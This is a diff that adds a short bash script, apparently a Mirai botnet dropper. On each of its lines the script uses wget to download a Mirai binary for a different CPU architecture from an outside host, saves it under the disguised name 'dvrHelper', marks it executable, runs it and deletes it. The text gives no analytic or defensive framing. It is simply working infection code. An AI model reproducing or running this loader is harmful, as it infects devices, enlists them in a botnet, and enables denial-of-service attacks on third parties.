@@ -1,0 +1,12 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.arm -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.m68k -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.mips -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.mpsl -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.x86 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.spc -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.arm7 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.arm5n -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.arm -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.ppc -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/mirai.sh4 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
